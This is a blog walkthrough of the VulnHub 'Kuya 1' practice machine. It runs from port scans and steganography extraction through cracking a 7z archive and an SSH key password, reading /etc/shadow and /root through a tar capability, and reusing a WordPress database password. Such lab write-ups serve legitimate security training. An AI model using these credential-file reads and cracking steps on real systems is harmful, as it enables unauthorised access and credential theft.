---
title:    "Kuya 1 writeup"
date:     2019-03-03
tags:     VulnHub writeup
category:	Cybersecurity
comment:  header sizes are 2000x750
header:
  image:    assets/images/2019-03-03-kuya-1-writeup/header.jpg
  teaser:   assets/images/2019-03-03-kuya-1-writeup/header.jpg
  caption:  "Photo credit: [**Unsplash**](https://unsplash.com)"
---

This is a relatively easy to crack machine. Let's start with the basics: Reconnaissance.

Kuya's IP in my network is `10.99.159.30`.

## Step 1: Scanning

### Nmap

```
$ nmap -n -v -Pn -p- -A 10.99.159.30
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 10:44 EST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:44
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE: Active NSE Script Threads: 1 (0 waiting)
NSE Timing: About 0.00% done
Completed NSE at 10:44, 0.00s elapsed
Initiating NSE at 10:44
Completed NSE at 10:44, 0.00s elapsed
Initiating ARP Ping Scan at 10:44
Scanning 10.99.159.30 [1 port]
Completed ARP Ping Scan at 10:44, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:44
Scanning 10.99.159.30 [65535 ports]
Discovered open port 22/tcp on 10.99.159.30
Discovered open port 80/tcp on 10.99.159.30
Completed SYN Stealth Scan at 10:44, 5.06s elapsed (65535 total ports)
Initiating Service scan at 10:44
Scanning 2 services on 10.99.159.30
Completed Service scan at 10:44, 6.02s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.99.159.30
NSE: Script scanning 10.99.159.30.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.24s elapsed
Initiating NSE at 10:45
Completed NSE at 10:45, 0.01s elapsed
Nmap scan report for 10.99.159.30
Host is up (0.00059s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 11:33:6d:34:f3:f2:12:9d:c6:6c:07:54:f0:86:53:d6 (RSA)
|   256 45:77:11:0d:b4:c6:3e:a4:bc:7a:b2:5f:02:03:8e:37 (ECDSA)
|_  256 00:27:20:4a:d8:b6:34:78:46:0e:cd:19:c2:9d:84:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome
MAC Address: 00:0C:29:98:32:F0 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.839 days (since Thu Aug 16 15:36:42 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=251 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 10.99.159.30

NSE: Script Post-scanning.
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
Initiating NSE at 10:45
Completed NSE at 10:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.59 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

A web server and an SSH server. To get into it, we'll probably have to look for clues in the web server first.

### Dirbuster

```
$ gobuster -u http://10.99.159.30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -np -t 1
2019/03/03 10:47:52 Starting gobuster
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.99.159.30/
[+] Threads      : 1
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
=====================================================
/wordpress (Status: 301)
/manual (Status: 301)
/javascript (Status: 301)
/loot (Status: 301)
/server-status (Status: 403)
=====================================================
=====================================================
2019/03/03 10:50:14 Finished
```

It has a WordPress installation, but it seems broken. Probably not interesting for now. The `/loot` folder, however, contains interesting files. Seemingly innocent images, but they probably are hiding something. Steghide will help us.

## Step 2: Breaking in

### Steghide

```
$ steghide --extract -sf 1.jpg
Enter passphrase: 
wrote extracted data to "secret.txt".
$ cat secret.txt
WW91IHJlYWxseSB0aG91Z2h0IGl0IHdvdWxkIGJlIHRoaXMgZWFzeSA/IEtlZXAgZGlnZ2luZyAhIExvdHMgb2YgdHJvbGxzIHRvIGRlZmVhdC4=
$ steghide --extract -sf 2.jpg
Enter passphrase: 
wrote extracted data to "emb.txt".
$ cat emb.txt
+[--->++<]>+.++[->++++<]>+.+++++++..[++>---<]>--.++[->++<]>.[--->+<]>+++.-.---------.--[--->+<]>-.+.-.--[->+++<]>-.[->+++++++<]>.++++++.---.[-->+++++<]>+++.+++[->++<]>.[-->+++<]>.+++++++++.+.+.[---->+<]>+++.+++[->++<]>.--[--->+<]>.-----------.++++++.-[--->+<]>--.-[--->++<]>-.++++++++++.+[---->+<]>+++.>+[--->++<]>.>-[----->+<]>-.++[->++<]>..----.-[--->++<]>+.-.--[++++>---<]>.-------------.-[--->+<]>+++.+[-->+<]>+++++.+.++[->+++++<]>.--.+[----->+<]>.--[++>---<]>.+[->++<]>.-[--->++<]>+.--.-[---->+++<]>-.
$ steghide --extract -sf 3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
$ steghide --extract -sf 4.jpg
Enter passphrase: 
wrote extracted data to "loot.pcapng".
$ steghide --extract -sf image.jpeg
Enter passphrase: 
wrote extracted data to "robots.txt".
$ cat robots.txt
1.jpg
2."
3."
4."
5."
image.jpeg
```

### Files

Because I didn't have a passphrase, I just tried an empty passphrase and that seems to do the trick for all files except `3.jpg`. Let's forget about it for now.

`secret.txt` seems like a Base64 file. After decoding it, we get: `You really thought it would be this easy ? Keep digging ! Lots of trolls to defeat.`

`emb.txt` is a Brainfuck program. When executed, it outputs the following: `Well Done ! Your First Flag is <FLAG>`

First flag.

`loot.pcapng` is a packet capture file. We can open it with Wireshark.

![Wireshark screenshot](/assets/images/2019-03-03-kuya-1-writeup/1.png)

It looks like a file transfer. We can actually extract files from Wireshark by going to `File` > `Export objects` > `HTTP`.

![Exporting Wireshark objects](/assets/images/2019-03-03-kuya-1-writeup/2.png)

![7z password](/assets/images/2019-03-03-kuya-1-writeup/3.png)

### Bruteforcing 7z password

It's an encrypted 7z file to which we don't have the password. [Let's crack it](https://github.com/koboi137/john/blob/master/7z2john.pl).

```

$ ./7z2john.pl loot.7z > hash.txt
$ john hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 0 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Wordlist
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any
Warning: Only 30 candidates buffered for the current salt, minimum 32
needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
manchester       (loot.7z)
[...]

```

We get two files. A public and a private SSH key pair.

```

$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPf01eRsS9o4Xaaog8Acmsd8ctkNA/qweGlDVYQqfGISzy/z0Sh3a2SlEVAweLnVKz1mdoKS4LrKnKxw0cR/fe7AChdY6wq/kCodLPCPmzMZQv12RUo1awO8gpuFA4RZdSmvDmtS1220cscm0fdSDrFt2sxNfn65dgPutJg+wMgssxrExzWjp9OR6AaAlB/naarcT28/LIsMh8DeHhOd9vs/Rew6LvX0mWyLJchAzqoMPHOrSaKu/b7YbMFUlJVvrivzBy35qwOdKFuX0Fa5Wg9TWDL9B1VDu+rFV/MTMdEkss+hIvS7Nl04ovplRLSE09TVa8dPUGGzMRVTGKxHON test@mini

```

Which apparently belongs to the `test` user.

### Bruteforcing SSH private keys

Unfortunately, the private key is also encrypted. Let's use John The Ripper again with [another tool that converts SSH keys to John The Ripper's hash format](https://github.com/koboi137/john/blob/master/ssh2john.py).

```
$ ./ssh2john.py loot/id_rsa > ssh_john.txt
$ john ssh_john.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Wordlist
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 8
needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hello            (loot/id_rsa)
```

### Logging into the SSH server

Now that we have cracked the password for the private key file, we can log in to the victim's machine.

```

$ ssh test@10.99.159.30 -i loot/id_rsa
The authenticity of host '10.99.159.30 (<no hostip for proxy command>)' can't be established.
ECDSA key fingerprint is SHA256:zyMHWQ6tB6OR+dKyv0X7ZXx6oCbYuH9/YbAxBwd5TCw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.99.159.30' (ECDSA) to the list of known hosts.
Enter passphrase for key 'loot/id_rsa': 
Linux mini 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 18 01:33:12 2018 from 192.168.37.1
test@mini:~$ ls -lAs
total 12
4 -rw------- 1 test test  464 Dec 18 01:33 .bash_history
4 drwx------ 2 test test 4096 Dec  2 14:34 .ssh
4 -rw-r--r-- 1 test test  168 Dec  2 17:55 .wget-hsts
test@mini:~$ cat .ssh/sshscript.sh 
#!/bin/bash
echo "FInally you got a shell ! Here's a flag for you  <FLAG>. Let's see  where you go from here"
test@mini:~$ cat .bash_history 
su kuya
getcap -r / 2>/dev/null
/sbin/getcap -r / 2>/dev/null
tar -cvf shadow.tar /etc/shadow
/sbin/getcap -r / 2>/dev/null
tar -cvf shadow.tar /etc/shadow
/sbin/getcap -r / 2>/dev/null
tar -cvf shadow.tar /etc/shadow
/sbin/getcap -r / 2>/dev/null
tar -cvf shadow.tar /etc/shadow
ls
tar -xvf shadow.tar 
ls -alh
tar -xvf shadow.tar 
cd etc
ls
cat shadow 
cd ..
ls
rm -rf *.*
ls
ls
ls
rm -rf *.*
ls
rm -rf etc
ls
ls -lah
rm -rf .bash_history 
rm -rf .nano/
ls
exit

```

Another flag. Let's keep going. The Bash history is interesting because it wasn't cleared, and the user appears to be using tar to create archives of files he normally shouldn't have permissions to read. Let's try those commands.

```
$ tar -cvf shadow.tar /etc/shadow
tar: Removing leading `/' from member names
/etc/shadow
$ tar -xvf shadow.tar
etc/shadow
```

At this point, I moved the shadow file to my desktop, so I can use John The Ripper on it, with the `rockyou.txt` dictionary while I look for other clues.

## Step 3: Privilege escalation

### Password reuse

We know the machine is running a web server. We also know the web server is serving a `wordpress` directory, but it complains about a missing MySQL extension. Let's see what we can get from here.

```
$ cd /var/www/html/wordpress
$ grep -r DB_PASSWORD
wp-admin/setup-config.php:	define('DB_PASSWORD', $pwd);
wp-admin/setup-config.php:			case 'DB_PASSWORD' :
wp-includes/load.php:	$wpdb = new wpdb( DB_USER, DB_PASSWORD, DB_NAME, DB_HOST );
wp-config-sample.php:define('DB_PASSWORD', 'Chrepia##@@!!');
```

We have an obvious password. What's the user?

```
$ cat wp-config-sample.php | grep DB_USER
define('DB_USER', 'kuya');
```

We can learn the user "kuya" exists on the system if we list the directories in `/home/`. Maybe password reuse works here.

```
$ ls /home
kuya  test
$ su kuya
Password: 
kuya@mini:~$ ls
shadow.tar  who_dis.txt
$ cat who_dis.txt 
Well Done ! 

BTW this was too easy :D

Here is something for you <FLAG>
```

Let's try the `tar` trick to steal the root flag too.

```
$ tar -cvf root.tar /root
tar: Removing leading `/' from member names
/root/
/root/.nano/
/root/M3m3L0rd.txt
/root/.selected_editor
/root/.bash_history
$ tar -xvf root.tar
root/
root/.nano/
root/M3m3L0rd.txt
root/.selected_editor
root/.bash_history
$ cat root/M3m3L0rd.txt
You did it !!!!

COngratulations :D 

I just hope you had the same fun as I had while making this box.

As this is my first box, please send in your reviews to me on syed.ashhad72@gmail.com (DOn't hack this please Mr Leet)

If you are still reading, you are wasting your time

THere is no flag here.

Seriously Stop


Well I can't help so here is the last one <FLAG>

#PeaceOut
```

## Wrap up

No, I was not able to crack the shadow file to get root. Also, I wasn't able
to find the correct password for the `3.jpg` file. I tried with all flags and all
passwords and potential passwords I harvested, but nothing worked. Maybe I missed
something?

This machine is available on [VulnHub](https://www.vulnhub.com/entry/kuya-1,283/).
